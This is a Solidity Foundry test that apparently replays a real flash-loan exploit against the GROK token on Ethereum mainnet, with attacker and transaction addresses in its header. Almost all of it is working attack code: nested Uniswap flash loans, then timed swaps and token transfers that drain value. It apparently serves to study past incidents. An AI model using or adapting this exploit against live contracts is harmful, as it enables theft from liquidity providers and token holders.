// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~26 ETH
// Attacker : https://etherscan.io/address/0x864e656c57a5a119f332c47326a35422294db5c9
// Attack Contract : https://etherscan.io/address/0x03e7b13bcd9b8383f403696c1494845560607eca
// Vuln Contract : https://etherscan.io/address/0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5
// Attack Tx : https://explorer.phalcon.xyz/tx/eth/0x3e9bcee951cdad84805e0c82d2a1e982e71f2ec301a1cbd344c832e0acaee813?line=136

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1722841076120130020

contract ContractTest is Test {
    Uni_Router_V2 router_v2 = Uni_Router_V2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    Uni_Router_V3 router_v3 = Uni_Router_V3(0xE592427A0AEce92De3Edee1F18E0157C05861564);
    IERC20 grok = IERC20(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5);
    IERC20 weth = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    Uni_Pair_V3 wethpair = Uni_Pair_V3(0x109830a1AAaD605BbF02a9dFA7B0B92EC2FB7dAa);
    Uni_Pair_V3 pair = Uni_Pair_V3(0x66bA59cBD09E75B209D1D7E8Cf97f4Ab34DA413B);

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        vm.createSelectFork("mainnet", 18_538_679 - 1);
        cheats.label(address(weth), "WETH");
    }

    function testExpolit() public {
        emit log_named_decimal_uint("attaker balance before attack:", weth.balanceOf(address(this)), weth.decimals());
        wethpair.flash(address(this), 0, 30_000_000_000_000_000_000, new bytes(1));
        emit log_named_decimal_uint("attaker balance after attack:", weth.balanceOf(address(this)), weth.decimals());
    }

    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {
        if (msg.sender == address(wethpair)) {
            pair.flash(address(this), 63_433_590_767_572_373, 0, new bytes(1));
            grok.approve(address(router_v3), grok.balanceOf(address(this)));
            router_v3.exactInputSingle(
                Uni_Router_V3.ExactInputSingleParams({
                    tokenIn: address(grok),
                    tokenOut: address(weth),
                    fee: 10_000,
                    recipient: address(this),
                    deadline: block.timestamp + 100,
                    amountIn: grok.balanceOf(address(this)),
                    amountOutMinimum: 30 ether,
                    sqrtPriceLimitX96: 0
                })
            );
            weth.transfer(address(wethpair), 30 ether + uint256(amount1));
        } else {
            weth.approve(address(router_v2), type(uint256).max);
            grok.approve(address(router_v2), type(uint256).max);
            grok.approve(address(router_v3), type(uint256).max);
            //first step
            address[] memory path = new address[](2);
            path[0] = address(grok);
            path[1] = address(weth);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_695_631_768_482_954, 0, path, address(this), block.timestamp + 100
            );
            grok.transfer(address(grok), 2_737_958_999_089_419);
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_000_000_000_000_000, 0, path, address(this), block.timestamp + 100
            );
            path[0] = address(weth);
            path[1] = address(grok);
            router_v2.swapTokensForExactTokens(
                64_067_926_675_248_097, weth.balanceOf(address(this)), path, address(this), block.timestamp + 100
            );
            grok.transfer(address(pair), grok.balanceOf(address(this)));
            //second step
            router_v2.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                30_000_000_000_000_000_000, 0, path, address(this), block.timestamp + 100
            );
        }
    }
}
